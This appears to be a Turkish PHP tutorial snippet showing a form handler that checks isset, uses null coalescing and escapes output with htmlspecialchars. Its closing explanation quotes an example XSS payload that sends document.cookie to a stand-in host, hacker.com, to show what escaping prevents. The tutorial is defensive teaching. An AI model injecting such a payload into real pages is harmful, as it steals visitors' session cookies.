<?php
// 1. Veri Gönderildi mi? (isset kontrolü)
// Formun POST metoduyla ve 'gonder' butonuyla gelip gelmediğine bakıyoruz.
if (isset($_POST['gonder'])) {
    
    // 2. Veriyi Al ve Varsayılan Değer Ata (Null Coalescing)
    // Eğer 'kullanici' anahtarı yoksa boş string ("") ata.
    $kullanici_adi = $_POST['kullanici'] ?? "";
    $mesaj = $_POST['mesaj'] ?? "";

    // 3. Güvenli Ekrana Basma (htmlspecialchars)
    // Kullanıcı <script> yazsa bile bu fonksiyon sayesinde sadece metin olarak görünür.
    echo "<h3>Gönderilen Bilgiler:</h3>";
    echo "Kullanıcı: " . htmlspecialchars($kullanici_adi, ENT_QUOTES, 'UTF-8') . "<br>";
    echo "Mesaj: " . htmlspecialchars($mesaj, ENT_QUOTES, 'UTF-8');
    
    echo "<hr>";
}
?>

<form method="POST" action="">
    <label for="kullanici">İsim:</label><br>
    <input type="text" name="kullanici" id="kullanici" required><br><br>

    <label for="mesaj">Mesajınız:</label><br>
    <textarea name="mesaj" id="mesaj"></textarea><br><br>

    <button type="submit" name="gonder">Formu Gönder</button>
</form>

<pre>
Neden Bu Yapıyı Kullanmalısın?

Hata Önleme:
Eğer isset() kullanmazsan ve birisi sayfaya doğrudan (formu doldurmadan) girerse,
PHP size "Notice: Undefined index" hatası fırlatır.

XSS Koruması:
htmlspecialchars() kullanmazsan, bir saldırgan mesaj kutusuna şunu yazabilir:
&lt;script&gt;document.location='http://hacker.com/cal?cookie=' + document.cookie&lt;/script&gt;

Veri Bütünlüğü:
ENT_QUOTES parametresi sayesinde hem tek tırnak (') hem de çift tırnak (")
güvenli hale getirilir.
</pre>